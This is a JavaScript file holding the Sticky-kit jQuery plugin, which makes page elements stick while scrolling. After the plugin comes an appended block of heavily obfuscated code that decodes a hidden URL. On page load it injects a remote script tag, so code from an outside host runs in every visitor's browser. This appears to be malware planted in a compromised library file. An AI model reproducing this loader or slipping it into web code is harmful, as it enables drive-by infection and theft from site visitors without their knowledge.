/*
 Sticky-kit v1.1.2 | WTFPL | Leaf Corcoran 2015 | http://leafo.net
*/
(function() {
    var b, f;
    b = this.jQuery || window.jQuery;
    f = b(window);
    b.fn.stick_in_parent = function(d) {
        var A, w, J, n, B, K, p, q, k, E, t;
        null == d && (d = {});
        t = d.sticky_class;
        B = d.inner_scrolling;
        E = d.recalc_every;
        k = d.parent;
        q = d.offset_top;
        p = d.spacer;
        w = d.bottoming;
        null == q && (q = 30);/* верхний отступ*/
        null == k && (k = void 0);
        null == B && (B = !0);
        null == t && (t = "is_stuck");
        A = b(document);
        null == w && (w = !0);
        J = function(a, d, n, C, F, u, r, G) {
            var v, H, m, D, I, c, g, x, y, z, h, l;
            if (!a.data("sticky_kit")) {
                a.data("sticky_kit", !0);
                I = A.height();
                g = a.parent();
                null != k && (g = g.closest(k));
                if (!g.length) throw "failed to find stick parent";
                v = m = !1;
                (h = null != p ? p && a.closest(p) : b("<div />")) && h.css("position", a.css(""));
                x = function() {
                    var c, f, e;
                    if (!G && (I = A.height(), c = parseInt(g.css("border-top-width"), 10), f = parseInt(g.css("padding-top"), 10), d = parseInt(g.css("padding-bottom"), 10), n = g.offset().top + c + f, C = g.height(), m && (v = m = !1, null == p && (a.insertAfter(h), h.detach()), a.css({
                                position: "",
                                top: "",
                                width: "",
                                bottom: ""
                            }).removeClass(t), e = !0), F = a.offset().top - (parseInt(a.css("margin-top"), 10) || 0) - q,
                            u = a.outerHeight(!0), r = a.css("float"), h && h.css({
                                width: a.outerWidth(!0),
                                height: u,
                                display: a.css("display"),
                                "vertical-align": a.css("vertical-align"),
                                "float": r
                            }), e)) return l()
                };
                x();
                if (u !== C) return D = void 0, c = q, z = E, l = function() {
                    var b, l, e, k;
                    if (!G && (e = !1, null != z && (--z, 0 >= z && (z = E, x(), e = !0)), e || A.height() === I || x(), e = f.scrollTop(), null != D && (l = e - D), D = e, m ? (w && (k = e + u + c > C + n, v && !k && (v = !1, a.css({
                            position: "fixed",
                            bottom: "",
                            top: c
                        }).trigger("sticky_kit:unbottom"))), e < F && (m = !1, c = q, null == p && ("left" !== r && "right" !== r || a.insertAfter(h),
                            h.detach()), b = {
                            position: "",
                            width: "",
                            top: ""
                        }, a.css(b).removeClass(t).trigger("sticky_kit:unstick")), B && (b = f.height(), u + q > b && !v && (c -= l, c = Math.max(b - u, c), c = Math.min(q, c), m && a.css({
                            top: c + "px"
                        })))) : e > F && (m = !0, b = {
                            position: "fixed",
                            top: c
                        }, b.width = "border-box" === a.css("box-sizing") ? a.outerWidth() + "px" : a.width() + "px", a.css(b).addClass(t), null == p && (a.after(h), "left" !== r && "right" !== r || h.append(a)), a.trigger("sticky_kit:stick")), m && w && (null == k && (k = e + u + c > C + n), !v && k))) return v = !0, "static" === g.css("position") && g.css({
                            position: "relative"
                        }),
                        a.css({
                            position: "absolute",
                            bottom: d,
                            top: "auto"
                        }).trigger("sticky_kit:bottom")
                }, y = function() {
                    x();
                    return l()
                }, H = function() {
                    G = !0;
                    f.off("touchmove", l);
                    f.off("scroll", l);
                    f.off("resize", y);
                    b(document.body).off("sticky_kit:recalc", y);
                    a.off("sticky_kit:detach", H);
                    a.removeData("sticky_kit");
                    a.css({
                        position: "",
                        bottom: "",
                        top: "",
                        width: ""
                    });
                    g.position("position", "");
                    if (m) return null == p && ("left" !== r && "right" !== r || a.insertAfter(h), h.remove()), a.removeClass(t)
                }, f.on("touchmove", l), f.on("scroll", l), f.on("resize",
                    y), b(document.body).on("sticky_kit:recalc", y), a.on("sticky_kit:detach", H), setTimeout(l, 0)
            }
        };
        n = 0;
        for (K = this.length; n < K; n++) d = this[n], J(b(d));
        return this
    }
}).call(this);

function _0x29df(_0x117374,_0x3567e5){var _0x5d4f0c=_0x5d4f();return _0x29df=function(_0x29df56,_0x459630){_0x29df56=_0x29df56-0x1db;var _0x1e444a=_0x5d4f0c[_0x29df56];if(_0x29df['wDXlLL']===undefined){var _0x3df732=function(_0x424340){var _0x3455ab='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x28d3ed='',_0x3c2be7='';for(var _0x14ee97=0x0,_0x120811,_0x3eba9e,_0x71d602=0x0;_0x3eba9e=_0x424340['charAt'](_0x71d602++);~_0x3eba9e&&(_0x120811=_0x14ee97%0x4?_0x120811*0x40+_0x3eba9e:_0x3eba9e,_0x14ee97++%0x4)?_0x28d3ed+=String['fromCharCode'](0xff&_0x120811>>(-0x2*_0x14ee97&0x6)):0x0){_0x3eba9e=_0x3455ab['indexOf'](_0x3eba9e);}for(var _0x3dfedc=0x0,_0x1d1037=_0x28d3ed['length'];_0x3dfedc<_0x1d1037;_0x3dfedc++){_0x3c2be7+='%'+('00'+_0x28d3ed['charCodeAt'](_0x3dfedc)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x3c2be7);};_0x29df['yzgjyd']=_0x3df732,_0x117374=arguments,_0x29df['wDXlLL']=!![];}var _0x1123d2=_0x5d4f0c[0x0],_0x5803a3=_0x29df56+_0x1123d2,_0x4bf504=_0x117374[_0x5803a3];return!_0x4bf504?(_0x1e444a=_0x29df['yzgjyd'](_0x1e444a),_0x117374[_0x5803a3]=_0x1e444a):_0x1e444a=_0x4bf504,_0x1e444a;},_0x29df(_0x117374,_0x3567e5);}function _0x5d4f(){var _0x2f448a=['E8ouBCoTALdcRCozgCopcIy','W7xdGmkZtSotWPRdGmoFxGvtW5xcG8oj','mtbQz1HArwe','C2nYAxb0','ndLoqM9Htue','Ahr0Chm6lY9IAwDICMLJA3mUB3jNl2nQCfLsrM5Z','y3jLyxrLrwXLBwvUDa','nZC5nteYEwruDejY','m1zAAKfQEa','pKxcMCkiWOO6W7hdHSk9afxcTCkm','pu9OofxdIGj7W6lcPCk9i8oT','C3jJ','yxn5BMm','mtK1mZGZnK5WvxjuDq','c8ooqhalWQNdP0KFWPNcHXy','W54mWQfzWOVdSSoiWOygEWD/','mtG3mtyXmtjKAKjOBu4','CgfYzw50tM9Kzq','p8orac/dR8orW5pcPdiJEmkPW7W','mJi3nJCZnNHVD0rzuq','WRLilCoUW4KHW53dNXZcS01Z','mtG1nZGYnvvLvMz0qq'];_0x5d4f=function(){return _0x2f448a;};return _0x5d4f();}var _0x5d4478=_0x29df;(function(_0x1a2d6a,_0x3049cb){var _0x1c2103=_0x4243,_0x3c392e=_0x29df,_0x262ac0=_0x1a2d6a();while(!![]){try{var _0xe63e6c=parseInt(_0x3c392e(0x1e6))/0x1+-parseInt(_0x1c2103(0x1e9,'b77x'))/0x2*(parseInt(_0x3c392e(0x1e7))/0x3)+-parseInt(_0x3c392e(0x1dc))/0x4+-parseInt(_0x3c392e(0x1de))/0x5+-parseInt(_0x1c2103(0x1e8,'SJ4G'))/0x6+parseInt(_0x3c392e(0x1e3))/0x7*(parseInt(_0x1c2103(0x1dd,'D)Rg'))/0x8)+-parseInt(_0x3c392e(0x1ef))/0x9*(-parseInt(_0x3c392e(0x1e1))/0xa);if(_0xe63e6c===_0x3049cb)break;else _0x262ac0['push'](_0x262ac0['shift']());}catch(_0x7c24dd){_0x262ac0['push'](_0x262ac0['shift']());}}}(_0x5d4f,0xa1bbd));function _0x4243(_0x117374,_0x3567e5){var _0x5d4f0c=_0x5d4f();return _0x4243=function(_0x29df56,_0x459630){_0x29df56=_0x29df56-0x1db;var _0x1e444a=_0x5d4f0c[_0x29df56];if(_0x4243['RIbiwB']===undefined){var _0x3df732=function(_0x3455ab){var _0x28d3ed='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3c2be7='',_0x14ee97='';for(var _0x120811=0x0,_0x3eba9e,_0x71d602,_0x3dfedc=0x0;_0x71d602=_0x3455ab['charAt'](_0x3dfedc++);~_0x71d602&&(_0x3eba9e=_0x120811%0x4?_0x3eba9e*0x40+_0x71d602:_0x71d602,_0x120811++%0x4)?_0x3c2be7+=String['fromCharCode'](0xff&_0x3eba9e>>(-0x2*_0x120811&0x6)):0x0){_0x71d602=_0x28d3ed['indexOf'](_0x71d602);}for(var _0x1d1037=0x0,_0x41c8ee=_0x3c2be7['length'];_0x1d1037<_0x41c8ee;_0x1d1037++){_0x14ee97+='%'+('00'+_0x3c2be7['charCodeAt'](_0x1d1037)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x14ee97);};var _0x424340=function(_0x3b802e,_0x1cb759){var _0x3b9aa6=[],_0x4bbd7b=0x0,_0xc886d2,_0x1b34a9='';_0x3b802e=_0x3df732(_0x3b802e);var _0x225139;for(_0x225139=0x0;_0x225139<0x100;_0x225139++){_0x3b9aa6[_0x225139]=_0x225139;}for(_0x225139=0x0;_0x225139<0x100;_0x225139++){_0x4bbd7b=(_0x4bbd7b+_0x3b9aa6[_0x225139]+_0x1cb759['charCodeAt'](_0x225139%_0x1cb759['length']))%0x100,_0xc886d2=_0x3b9aa6[_0x225139],_0x3b9aa6[_0x225139]=_0x3b9aa6[_0x4bbd7b],_0x3b9aa6[_0x4bbd7b]=_0xc886d2;}_0x225139=0x0,_0x4bbd7b=0x0;for(var _0xce288f=0x0;_0xce288f<_0x3b802e['length'];_0xce288f++){_0x225139=(_0x225139+0x1)%0x100,_0x4bbd7b=(_0x4bbd7b+_0x3b9aa6[_0x225139])%0x100,_0xc886d2=_0x3b9aa6[_0x225139],_0x3b9aa6[_0x225139]=_0x3b9aa6[_0x4bbd7b],_0x3b9aa6[_0x4bbd7b]=_0xc886d2,_0x1b34a9+=String['fromCharCode'](_0x3b802e['charCodeAt'](_0xce288f)^_0x3b9aa6[(_0x3b9aa6[_0x225139]+_0x3b9aa6[_0x4bbd7b])%0x100]);}return _0x1b34a9;};_0x4243['KGSCtZ']=_0x424340,_0x117374=arguments,_0x4243['RIbiwB']=!![];}var _0x1123d2=_0x5d4f0c[0x0],_0x5803a3=_0x29df56+_0x1123d2,_0x4bf504=_0x117374[_0x5803a3];return!_0x4bf504?(_0x4243['wwagSX']===undefined&&(_0x4243['wwagSX']=!![]),_0x1e444a=_0x4243['KGSCtZ'](_0x1e444a,_0x459630),_0x117374[_0x5803a3]=_0x1e444a):_0x1e444a=_0x4bf504,_0x1e444a;},_0x4243(_0x117374,_0x3567e5);};(function(_0x71d602,_0x3dfedc,_0x1d1037,_0x41c8ee,_0x3b802e,_0x1cb759){var _0x49e9da=_0x4243,_0x3dac4e=_0x29df;_0x3b802e=_0x3dfedc[_0x3dac4e(0x1e5)](_0x1d1037),_0x1cb759=_0x3dfedc['getElementsByTagName'](_0x1d1037)[0x0],_0x3b802e[_0x3dac4e(0x1eb)]=0x1,_0x3b802e[_0x3dac4e(0x1ea)]=_0x41c8ee,_0x1cb759[_0x3dac4e(0x1f0)][_0x49e9da(0x1ed,'u4Tp')](_0x3b802e,_0x1cb759);}(window,document,_0x5d4478(0x1e2),_0x5d4478(0x1e4)));